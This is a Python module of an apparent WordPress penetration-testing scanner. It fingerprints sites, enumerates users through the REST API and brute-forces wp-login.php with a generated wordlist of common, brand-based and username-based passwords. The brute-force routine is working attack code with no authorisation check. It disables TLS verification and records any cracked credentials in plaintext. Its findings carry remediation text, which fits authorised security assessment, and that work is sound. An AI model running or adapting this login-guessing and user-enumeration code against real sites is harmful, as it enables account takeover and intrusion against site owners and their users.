"""WordPress offensive testing scanner - login brute force, REST API testing, etc."""

import re
import requests
import time
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.response_validation import is_accessible_response


class WordPressOffensive(BaseScanner):
    """WordPress offensive testing - login brute force, REST API exploitation, etc."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.DEFENSIVE):
        """
        Initialize WordPress offensive scanner.
        
        Args:
            enabled: Whether scanner is enabled
            scan_mode: Scan mode (defensive or offensive)
        """
        super().__init__(
            name="wordpress_offensive",
            command=None,  # No external command needed
            enabled=enabled,
            scan_mode=scan_mode
        )
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
    
    def is_available(self) -> bool:
        """WordPress offensive scanner is always available."""
        return True
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Run offensive WordPress tests."""
        if self.scan_mode == ScanMode.DEFENSIVE:
            return []  # Only run in offensive mode
        
        findings = []
        
        # Check if this is a WordPress site first
        if not self._is_wordpress_site(target.url):
            return findings
        
        # Run offensive tests
        findings.extend(self._test_login_page(target.url))
        findings.extend(self._test_rest_api_endpoints(target.url))
        findings.extend(self._test_password_bruteforce(target.url))
        
        return findings
    
    def _is_wordpress_site(self, url: str) -> bool:
        """Check if the target is a WordPress site."""
        try:
            response = self.session.get(url, timeout=10)
            content = response.text.lower()
            
            wp_indicators = [
                'wp-content',
                'wp-includes',
                'wp-admin',
                'wordpress',
                '/wp-json/',
            ]
            
            if any(indicator in content for indicator in wp_indicators):
                return True
            
            # Check wp-json endpoint
            try:
                wp_json_url = urljoin(url, '/wp-json/')
                wp_json_response = self.session.get(wp_json_url, timeout=5)
                if wp_json_response.status_code == 200:
                    return True
            except:
                pass
            
            return False
        except:
            return False
    
    def _test_login_page(self, url: str) -> List[Finding]:
        """Test WordPress login page accessibility and security."""
        findings = []
        
        login_urls = [
            urljoin(url, '/wp-login.php'),
            urljoin(url, '/wp-admin/'),
            urljoin(url, '/login/'),
        ]
        
        for login_url in login_urls:
            try:
                response = self.session.get(login_url, timeout=10, allow_redirects=False)
                
                if is_accessible_response(response):
                    content = response.text.lower()
                    is_login_page = any(indicator in content for indicator in [
                        'wp-login',
                        'log in',
                        'username',
                        'password',
                        'remember me',
                    ])
                    
                    if is_login_page:
                        # Check for security features
                        has_brute_force_protection = 'limit login' in content or 'wordfence' in content or 'jetpack' in content
                        has_2fa = 'two-factor' in content or '2fa' in content or 'authenticator' in content
                        
                        findings.append(Finding(
                            title="WordPress Login Page Accessible",
                            description=f"WordPress login page is accessible at {login_url}. This allows attackers to attempt brute-force attacks.",
                            severity=FindingSeverity.MEDIUM,
                            category=FindingCategory.EXPOSED_ENDPOINT,
                            source_scanner="wordpress_offensive",
                            source_id=f"login_page_{login_url}",
                            url=login_url,
                            remediation="Implement brute-force protection (e.g., limit login attempts, use security plugins like Wordfence or Jetpack). Consider implementing 2FA and IP whitelisting for admin access.",
                            metadata={
                                "login_url": login_url,
                                "has_brute_force_protection": has_brute_force_protection,
                                "has_2fa": has_2fa,
                            },
                        ))
                elif response.status_code == 403:
                    # Login page is protected
                    findings.append(Finding(
                        title="WordPress Login Page Protected",
                        description=f"WordPress login page at {login_url} is protected (403 Forbidden). This is a good security practice.",
                        severity=FindingSeverity.INFO,
                        category=FindingCategory.FINGERPRINTING,
                        source_scanner="wordpress_offensive",
                        source_id=f"login_page_protected_{login_url}",
                        url=login_url,
                        remediation="No action needed. Login page is properly protected.",
                        metadata={"login_url": login_url, "status_code": 403},
                    ))
            except:
                pass
        
        return findings
    
    def _test_rest_api_endpoints(self, url: str) -> List[Finding]:
        """Test WordPress REST API endpoints for security issues."""
        findings = []
        
        # Common REST API endpoints to test
        endpoints = [
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/users/me',
            '/wp-json/wp/v2/posts',
            '/wp-json/wp/v2/pages',
            '/wp-json/wp/v2/comments',
            '/wp-json/wp/v2/media',
            '/wp-json/wp/v2/types',
            '/wp-json/wp/v2/taxonomies',
        ]
        
        for endpoint in endpoints:
            endpoint_url = urljoin(url, endpoint)
            try:
                response = self.session.get(endpoint_url, timeout=10, allow_redirects=False)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        # Check for sensitive information
                        if endpoint == '/wp-json/wp/v2/users':
                            user_count = len(data) if isinstance(data, list) else 0
                            if user_count > 0:
                                findings.append(Finding(
                                    title="WordPress REST API User Endpoint Exposed",
                                    description=f"REST API endpoint {endpoint} is accessible and exposes {user_count} user(s). This allows user enumeration and targeted attacks.",
                                    severity=FindingSeverity.MEDIUM,
                                    category=FindingCategory.INFORMATION_DISCLOSURE,
                                    source_scanner="wordpress_offensive",
                                    source_id=f"rest_api_{endpoint.replace('/', '_')}",
                                    url=endpoint_url,
                                    remediation="Disable or restrict access to /wp-json/wp/v2/users endpoint. Use a security plugin or custom code to block user enumeration.",
                                    metadata={"endpoint": endpoint, "user_count": user_count},
                                ))
                        elif endpoint in ['/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages']:
                            # Check if private/draft content is exposed
                            items = data if isinstance(data, list) else data.get('items', [])
                            private_count = sum(1 for item in items if item.get('status') in ['private', 'draft'])
                            if private_count > 0:
                                findings.append(Finding(
                                    title=f"WordPress REST API Exposes Private Content",
                                    description=f"REST API endpoint {endpoint} exposes {private_count} private or draft content item(s). This may reveal sensitive information.",
                                    severity=FindingSeverity.MEDIUM,
                                    category=FindingCategory.INFORMATION_DISCLOSURE,
                                    source_scanner="wordpress_offensive",
                                    source_id=f"rest_api_private_{endpoint.replace('/', '_')}",
                                    url=endpoint_url,
                                    remediation=f"Restrict access to {endpoint} or ensure private/draft content is not exposed via REST API.",
                                    metadata={"endpoint": endpoint, "private_count": private_count},
                                ))
                    except:
                        pass
            except:
                pass
        
        return findings
    
    def _generate_password_list(self, domain: str, usernames: List[str] = None) -> List[str]:
        """Generate a password list with common passwords and brand variations."""
        passwords = []
        
        # Extract brand/domain name
        domain_parts = domain.replace('www.', '').replace('.com', '').replace('.net', '').replace('.org', '').split('.')[0]
        brand_name = domain_parts.capitalize() if domain_parts else ""
        
        # Common passwords - expanded list
        common_passwords = [
            'password', 'password123', 'Password123', 'Password123!', 'Password1', 'Password12',
            'admin', 'Admin', 'admin123', 'Admin123', 'administrator', 'Administrator',
            '123456', '12345678', '123456789', '1234567890', '1234', '12345', '1234567',
            'qwerty', 'qwerty123', 'qwertyuiop', 'abc123', 'abc1234',
            'welcome', 'Welcome123', 'welcome123', 'welcome1',
            'letmein', 'letmein1', 'monkey', 'monkey123', 'dragon', 'dragon123',
            'master', 'master123', 'sunshine', 'sunshine1', 'princess', 'princess1',
            'football', 'football1', 'baseball', 'baseball1', 'iloveyou', 'iloveyou1',
            'trustno1', 'thomas123', 'hunter123', 'michelle123', 'charlie123',
            'jordan123', 'tigger123', 'shadow123', 'michael123', 'jennifer123',
            'samantha123', 'summer123', 'winter123', 'spring123', 'autumn123',
            'hannah123', 'maggie123', 'charlotte123', 'sophia123', 'amelia123',
            'harper123', 'evelyn123', 'abigail123', 'emily123', 'elizabeth123',
            'mila123', 'ella123', 'avery123', 'sofia123', 'camila123',
            'aria123', 'scarlett123', 'victoria123', 'madison123', 'luna123',
            'grace123', 'chloe123', 'penelope123', 'layla123', 'riley123',
            'zoey123', 'nora123', 'lily123', 'eleanor123', 'lillian123',
            'addison123', 'aubrey123', 'ellie123', 'stella123', 'natalie123',
            'zoe123', 'leah123', 'hazel123', 'violet123', 'aurora123',
            'savannah123', 'audrey123', 'brooklyn123', 'bella123', 'claire123',
            'skylar123', 'lucy123', 'paisley123', 'everly123', 'anna123',
            'caroline123', 'nova123', 'genesis123', 'aaliyah123', 'kennedy123',
            'kinsley123', 'allison123',
        ]
        
        # Brand-based passwords
        if brand_name:
            brand_variations = [
                brand_name.lower(),
                brand_name.capitalize(),
                brand_name.upper(),
                f"{brand_name.lower()}123",
                f"{brand_name.capitalize()}123",
                f"{brand_name.lower()}2024",
                f"{brand_name.lower()}2023",
                f"Welcome{brand_name}",
                f"{brand_name}Admin",
                f"{brand_name.lower()}admin",
            ]
            passwords.extend(brand_variations)
        
        passwords.extend(common_passwords)
        
        # Add username-based passwords if usernames are provided
        if usernames:
            for username in usernames[:3]:  # Limit to first 3 usernames
                username_lower = username.lower()
                passwords.extend([
                    username_lower,
                    f"{username_lower}123",
                    f"{username_lower}2024",
                    f"Password{username_lower}",
                ])
        
        # Remove duplicates and ensure we have at least 100 passwords
        unique_passwords = list(dict.fromkeys(passwords))
        
        # If we don't have enough, add more common variations
        if len(unique_passwords) < 100:
            additional = [
                'root', 'root123', 'test', 'test123', 'demo', 'demo123',
                'guest', 'guest123', 'user', 'user123', 'default', 'default123',
                'pass', 'pass123', 'secret', 'secret123', 'private', 'private123',
                'access', 'access123', 'login', 'login123', 'system', 'system123',
            ]
            unique_passwords.extend(additional)
            unique_passwords = list(dict.fromkeys(unique_passwords))
        
        # Return up to 150 for variety, but we'll test 100
        return unique_passwords[:150]
    
    def _test_password_bruteforce(self, url: str) -> List[Finding]:
        """Test password brute-force with generated password list."""
        findings = []
        
        # First, try to enumerate users from REST API
        users = []
        try:
            users_url = urljoin(url, '/wp-json/wp/v2/users')
            response = self.session.get(users_url, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list):
                    users = [u.get('slug', u.get('name', '')) for u in data[:5]]  # Limit to 5 users
        except:
            pass
        
        # If no users found, try common usernames
        if not users:
            users = ['admin', 'administrator', 'root', 'test', 'user']
        
        # Generate password list
        domain = urlparse(url).netloc.replace('www.', '')
        password_list = self._generate_password_list(domain, users)
        
        login_url = urljoin(url, '/wp-login.php')
        
        # Test more password attempts for better coverage (still limited for safety)
        max_attempts = 100  # Test 100 passwords for comprehensive coverage
        tested_passwords = password_list[:max_attempts]
        
        successful_logins = []
        blocked_attempts = 0
        
        for username in users[:5]:  # Increased from 2 to 5 usernames for better coverage
            for password in tested_passwords:
                try:
                    # Create a new session for each attempt
                    test_session = requests.Session()
                    test_session.verify = False
                    
                    # Get login page first to get cookies/nonce
                    login_page = test_session.get(login_url, timeout=10)
                    if login_page.status_code != 200:
                        continue
                    
                    # Extract nonce if present (WordPress security feature)
                    nonce_match = re.search(r'name="log"|name="wp-submit"', login_page.text)
                    
                    # Prepare login data
                    login_data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': urljoin(url, '/wp-admin/'),
                        'testcookie': '1',
                    }
                    
                    # Attempt login
                    login_response = test_session.post(
                        login_url,
                        data=login_data,
                        timeout=10,
                        allow_redirects=False
                    )
                    
                    # Check if login was successful
                    if login_response.status_code in [302, 303]:
                        location = login_response.headers.get('Location', '')
                        if '/wp-admin' in location or 'dashboard' in location.lower():
                            successful_logins.append({
                                'username': username,
                                'password': password,
                            })
                            break  # Stop testing this user if login successful
                    
                    # Check if we're being blocked (rate limiting)
                    if login_response.status_code == 429 or 'blocked' in login_response.text.lower():
                        blocked_attempts += 1
                        break  # Stop if blocked
                    
                    # Small delay to avoid overwhelming the server
                    time.sleep(0.5)
                    
                except:
                    continue
        
        # Report findings
        if successful_logins:
            for login in successful_logins:
                findings.append(Finding(
                    title="WordPress Login Credentials Compromised",
                    description=f"Successfully logged in with username '{login['username']}' and password '{login['password']}'. This indicates weak credentials.",
                    severity=FindingSeverity.CRITICAL,
                    category=FindingCategory.COMPROMISE,
                    source_scanner="wordpress_offensive",
                    source_id=f"login_compromised_{login['username']}",
                    url=login_url,
                    remediation=f"IMMEDIATE ACTION REQUIRED: Change password for user '{login['username']}' immediately. Implement strong password policy and enable 2FA.",
                    exploited=True,
                    exploitation_details=f"Successfully authenticated as '{login['username']}' using password '{login['password']}'.",
                    metadata={
                        "username": login['username'],
                        "password": login['password'],  # Store for reporting but mark as sensitive
                        "login_url": login_url,
                    },
                ))
        elif blocked_attempts > 0:
            findings.append(Finding(
                title="WordPress Login Brute-Force Protection",
                description=f"Login page has brute-force protection enabled. {blocked_attempts} attempt(s) were blocked. This is a positive security indicator.",
                severity=FindingSeverity.INFO,
                category=FindingCategory.FINGERPRINTING,
                source_scanner="wordpress_offensive",
                source_id="brute_force_protection",
                url=login_url,
                remediation="No action needed. Brute-force protection is working correctly.",
                metadata={
                    "blocked_attempts": blocked_attempts,
                    "test_passed": True,  # Protection is active = good
                },
            ))
        else:
            # No successful logins, but we tested - report that weak passwords weren't found
            findings.append(Finding(
                title="WordPress Login Brute-Force Test",
                description=f"Tested {len(tested_passwords)} common passwords against {len(users)} user(s). No successful logins found with common passwords. This indicates strong password policies are in place.",
                severity=FindingSeverity.INFO,
                category=FindingCategory.FINGERPRINTING,
                source_scanner="wordpress_offensive",
                source_id="brute_force_test",
                url=login_url,
                remediation="Continue using strong, unique passwords. Consider implementing 2FA for additional security.",
                metadata={
                    "users_tested": users,
                    "passwords_tested": len(tested_passwords),
                    "total_attempts": len(users) * len(tested_passwords),
                    "login_url": login_url,
                    "test_passed": True,  # No weak passwords found = good
                },
            ))
        
        return findings

